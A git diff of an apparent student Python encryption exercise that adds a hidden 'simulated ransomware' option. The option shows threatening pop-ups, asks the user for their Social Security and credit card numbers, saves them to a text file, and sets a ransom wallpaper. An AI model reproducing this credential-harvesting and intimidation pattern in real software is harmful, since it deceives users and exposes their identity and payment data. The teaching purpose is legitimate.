@@ -2,8 +2,8 @@
 
 # Script: Ops Challenge 06 File Encryption
 # Author: Ray Caoagdan
-# Date of Last Revision: 07/11/2021
-# Purpose: Encryption with Python
+# Date of Last Revision: 07/19//2021
+# Purpose: Encryption with Python | Create a Simulated RansomWare Attack
 
 
 ##############################################################################
@@ -11,6 +11,9 @@
 ##############################################################################
 import base64 
 import os
+import pyautogui
+import ctypes 
+from os import path
 from cryptography.fernet import Fernet 
 
 ##############################################################################
@@ -25,7 +28,8 @@ def main_menu():
     print("4.Decrypt a Folder")
     print("5.Enrypt a message")
     print("6.Decrypt a messsage")
-    print("7.Exit")
+    print("7.DO NOT PRESS ME")
+    print("8.Exit")
     mainResponse = input("Desired Request:")
     if mainResponse == '1':
         fileEncryption()
@@ -40,6 +44,8 @@ def main_menu():
     elif mainResponse == '6':
         msgDecryption()
     elif mainResponse == '7':
+        yourPCisMine()
+    elif mainResponse == '8':
         exit
     else:
         print("Incorrect selection made")
@@ -65,6 +71,7 @@ def loadKey():
 writeKey()
 key=loadKey()
 fK=Fernet(key)
+
 ##############################################################################
 # File Encryption 
 ##############################################################################
@@ -108,7 +115,6 @@ def folderEncrypt():
             eF.write(eData)
         eF.close()
     main_menu()
-
 
 ##############################################################################
 # Folder Decryption
@@ -154,6 +160,41 @@ def msgDecryption():
     print(oMsg)
     print("Decrypted Message:")
     main_menu()
+
+##############################################################################
+# Ransomware
+##############################################################################
+def yourPCisMine():
+    print(" ")
+    ransomTile=("YOUR PC IS NOW MINE")
+    pyautogui.alert('I Warned You Not To Press Me',ransomTile)
+    pyautogui.alert('Now You Must Face the Consequences',ransomTile)
+    pyautogui.alert('I now control your PC',ransomTile)
+    ransomPC=pyautogui.confirm('DO YOU WANT IT BACK?',ransomTile,['YES','NO'])
+    if ransomPC == 'YES':
+        pyautogui.alert('Excellent',ransomTile)
+        ransomSend()
+    else:
+        pyautogui.alert('Uhh... Okay then',ransomTile)
+    ransomWall()
+
+def ransomSend():
+    userFname=pyautogui.prompt("What is your First Name:")
+    userLname=pyautogui.prompt("What is your Last Name:")
+    userSocial=pyautogui.prompt("What is your Social Security Number")
+    userAddress=pyautogui.prompt("What is your Address:")
+    userCC=pyautogui.prompt("What is your Credit Card Number:")
+    userFULLNAME=(userFname+" "+ userLname)
+    userInfo=[userFULLNAME,userSocial,userAddress,userCC]
+    with open('ransom.txt','w') as ransomTxt:
+        for userInput in userInfo:
+            ransomTxt.write('%s\n' % userInput)
+    ransomTxt.close()
+
+def ransomWall():
+    ransomIMG='C:/Users/rcaoa/OneDrive/Documents/Ops401/anon.jpg'
+    ctypes.windll.user32.SystemParametersInfoW(20,0,ransomIMG,0)
+
 ##############################################################################
 # Main
 ##############################################################################
@@ -169,6 +210,9 @@ main_menu()
 ## https://stackabuse.com/encoding-and-decoding-base64-strings-in-python
 ## https://www.thepythoncode.com/article/encrypt-decrypt-files-symmetric-python
 ## https://pypi.org/project/cryptography/
+
+##OS PATH
+## https://careerkarma.com/blog/python-os-path-join/ 
 ##############################################################################
 # End Sources 
 ##############################################################################
